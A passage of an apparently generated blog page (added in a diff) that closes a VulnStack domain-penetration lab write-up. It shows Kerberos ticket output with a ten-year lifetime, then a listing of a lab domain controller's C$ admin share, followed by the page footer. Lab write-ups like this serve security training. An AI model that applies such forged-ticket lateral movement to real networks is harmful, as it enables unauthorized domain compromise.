RC4-HMAC(NT)</span><br><span class="line">        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        Start Time: 8/3/2024 21:47:39 (local)</span><br><span class="line">        End Time:   8/1/2034 21:47:39 (local)</span><br><span class="line">        Renew Time: 8/1/2034 21:47:39 (local)</span><br><span class="line">        Session Key Type: RSADSI RC4-HMAC(NT)</span><br><span class="line">C:\&gt;dir \\WIN-8GA56TNV3MV.test.org\c$</span><br><span class="line"> Directory of \\WIN-8GA56TNV3MV.test.org\c$</span><br><span class="line">08/22/2013  11:52 PM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">10/28/2019  08:44 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">08/22/2013  11:39 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">10/06/2019  07:14 PM    &lt;DIR&gt;          Users</span><br><span class="line">10/30/2019  10:31 PM    &lt;DIR&gt;          Windows</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  50,326,691,840 bytes free</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/VulnStack/" rel="tag"># VulnStack</a>
+              <a href="/tags/Domain/" rel="tag"># Domain</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/26/Windows%E5%8A%A0%E5%9B%BA/" rel="prev" title="Windows 10加固">
+                  <i class="fa fa-chevron-left"></i> Windows 10加固
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/08/08/%E7%8F%9E%E5%AE%89%E7%A7%91%E6%8A%80_%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E9%A2%98WriteUp/" rel="next" title="珞安科技_中国工业互联网安全大赛练习题WriteUp">
+                  珞安科技_中国工业互联网安全大赛练习题WriteUp <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rerestst</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
